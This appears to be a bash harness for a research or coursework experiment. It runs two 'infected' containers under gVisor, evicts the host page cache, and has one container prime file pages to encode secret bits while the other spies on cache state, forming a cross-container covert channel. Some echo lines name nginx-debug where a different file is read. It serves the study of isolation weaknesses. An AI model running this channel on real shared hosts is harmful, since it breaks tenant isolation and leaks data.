#!/bin/bash
COMMAND="./reproduce_QEMU.sh 0"
TARGET_FILES=("/workspace/rand0.bin" "/workspace/rand1.bin")
VM_PATH="/home/fwilke/edu/BU/ec721"
MEASURE_PAGE_COUNT=1


RUNTIME=runsc-kvm
TARGET_PAGE=0


set -e

docker --version

echo "Running the two containers..."
IMAGE_PATH=union-buster:latest
CONTAINER_NAMES=(infected_1 infected_2)
for n in ${CONTAINER_NAMES[@]}; do
    sudo docker rm --force ${n} || true
    echo "sudo docker run --runtime=$RUNTIME -d --name ${n} $IMAGE_PATH"
    sudo docker run --runtime=$RUNTIME -d --name ${n} $IMAGE_PATH
done


echo -e "\n------------------------------ CONTAINERS ------------------------------"
sudo docker container ls
echo -e "------------------------------------------------------------------------\n"



for secret in {0..3}; do  
    for i in {1..100}; do
        echo -e "\nEvicting page cache on the host..."
        sync
        echo 1 | sudo tee -a /proc/sys/vm/drop_caches
        echo "========> Entire OS Page Cache is now evicted."

        #iterate over target files  
        for index in {0..1}; do
            TARGET_FILE=${TARGET_FILES[$index]}
            #prime file if the secret's bit at the index of the target file is 1
            bit=$(( (secret >> index) & 1 ))
            if [ $bit -eq 1 ]; then
                echo -e "\n---> [infected_1]: /workspace/read_page /usr/sbin/nginx-debug $TARGET_PAGE"
                sudo docker exec -it infected_1 /workspace/read_page $TARGET_FILE $TARGET_PAGE
                echo "========> page $TARGET_PAGE of /usr/sbin/nginx-debug is now loaded in the page cache."

            else
                echo "Not priming file $TARGET_FILE for secret $secret (bit $index is 0)."
            fi
        done
        

        echo -e "\n---> [infected_2]: /workspace/spy_on  ${TARGET_FILES[0]} $MEASURE_PAGE_COUNT"
        sudo docker exec -it infected_2 /workspace/spy_on ${TARGET_FILES[0]} $MEASURE_PAGE_COUNT
        
        echo -e "\n---> [infected_2]: /workspace/spy_on  ${TARGET_FILES[1]} $MEASURE_PAGE_COUNT"
        sudo docker exec -it infected_2 /workspace/spy_on ${TARGET_FILES[1]} $MEASURE_PAGE_COUNT
    done
done
